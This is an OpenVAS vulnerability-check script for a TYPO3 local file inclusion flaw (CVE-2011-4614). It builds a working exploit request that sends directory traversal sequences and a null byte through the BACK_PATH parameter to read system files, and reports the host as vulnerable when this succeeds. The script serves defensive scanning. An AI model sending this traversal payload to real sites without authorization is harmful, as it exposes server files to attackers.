###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_typo3_back_path_lfi_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# TYPO3 'BACK_PATH' Parameter Local File Include Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow an attacker to obtain arbitrary local
  files in the context of an affected site.
  Impact Level: Application";
tag_affected = "TYPO3 version 4.5.x before 4.5.9, 4.6.x before 4.6.2 and development
  versions of 4.7";
tag_insight = "The flaw is due to an input passed to the 'BACK_PATH' parameter in
  'typo3/sysext/workspaces/Classes/Controller/AbstractController.php' is not
  properly verified before being used to include files.";
tag_solution = "Upgrade to TYPO3 version 4.5.9 or 4.6.2 or later
  For updates refer to http://typo3.org/download/packages/";
tag_summary = "This host is running TYPO3 and is prone to local file inclusion
  vulnerability.";

if(description)
{
  script_id(902795);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2011-4614");
  script_bugtraq_id(51090);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-02-22 13:46:49 +0530 (Wed, 22 Feb 2012)");
  script_name("TYPO3 'BACK_PATH' Parameter Local File Include Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.osvdb.org/77776");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/47201");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/72959");

  script_description(desc);
  script_summary("Check if TYPO3 is prone to LFI");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
port = 0;
sndReq = "";
rcvRes = "";
dir = "";
url = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

foreach dir (make_list("/typo3", "/TYPO3", cgi_dirs()))
{
  sndReq = http_get(item:string(dir, "/index.php"), port:port);
  rcvRes = http_send_recv(port:port, data:sndReq);

  ## confirm the application
  if(rcvRes && "<title>TYPO3 Login" >< rcvRes && ">TYPO3.org<" >< rcvRes)
  {
    files = traversal_files();

    foreach file (keys(files))
    {
      ## Constuct exploit
      url = string(dir, "/sysext/workspaces/Classes/Controller/" +
                  "AbstractController.php?BACK_PATH=",
                  crap(data:"..%2f",length:5*10), files[file], "%00");

      ## Confirm exploit worked properly or not
      if(http_vuln_check(port:port, url:url, pattern:file))
      {
        security_hole(port);
        exit(0);
      }
    }
  }
}
